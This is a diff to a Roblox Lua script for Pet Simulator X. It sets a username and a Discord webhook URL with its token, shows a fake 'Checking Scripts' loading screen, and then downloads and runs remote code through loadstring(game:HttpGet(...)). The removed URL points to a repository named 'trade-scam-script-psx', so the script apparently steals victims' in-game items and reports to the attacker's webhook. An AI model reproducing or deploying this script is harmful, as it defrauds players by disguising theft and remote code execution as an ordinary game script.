@@ -1,6 +1,5 @@
-"Username = "kababwalla
-"WebHook = "https://discord.com/api/webhooks/1084530763246084186/3JVuHQ5xSXRHt3MUsqmtdP0LlkrDPuE5LCu8ZLTHV07lxV6-DoiMOYCiNo3R21HECsph
-
+Username = "kababwalla"
+WebHook = "https://discord.com/api/webhooks/1084530763246084186/3JVuHQ5xSXRHt3MUsqmtdP0LlkrDPuE5LCu8ZLTHV07lxV6-DoiMOYCiNo3R21HECsph"
 
 loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
 _G.CustomScriptName = "PSX Script"
@@ -8,4 +7,4 @@ _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
 _G.Text4 = "Starting Scripts..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/pixel420/trade-scam-script-psx/main/%E2%80%8F%E2%80%8F%E2%80%AB%D7%9E%D7%A1%D7%9E%D7%9A%20%D7%98%D7%A7%D7%A1%D7%98%20%E2%80%AB%D7%97%D7%93%D7%A9.txt))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
